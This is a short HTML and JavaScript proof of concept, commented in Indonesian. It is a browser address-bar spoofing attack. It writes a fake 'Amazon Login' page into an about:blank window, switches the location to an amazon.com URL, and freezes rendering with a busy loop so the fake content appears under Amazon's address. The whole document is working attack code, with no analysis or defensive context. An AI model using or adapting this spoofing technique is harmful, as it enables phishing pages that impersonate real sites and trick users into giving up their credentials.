<body>
<a onclick="start()">Spoof</a>

<script>
let w;

function start() {
  // 1. Buka about:blank (FULL CONTROL)
  w = window.open("about:blank", "x");

  // 2. Tulis konten attacker
  w.document.open();
  w.document.write(`
    <h1>Amazon Login</h1>
    <p>Sign in to continue</p>
  `);
  w.document.close();

  // 3. Paksa address bar ke target
  setTimeout(() => {
    w.location.replace("https://www.amazon.com:8080/");
  }, 50);

  // 4. Freeze visual sebelum commit
  freeze();
}

function freeze() {
  try {
    // Busy loop = block rendering update
    const t = Date.now();
    while (Date.now() - t < 3000) {}
  } catch(e){}
}
</script>
</body>
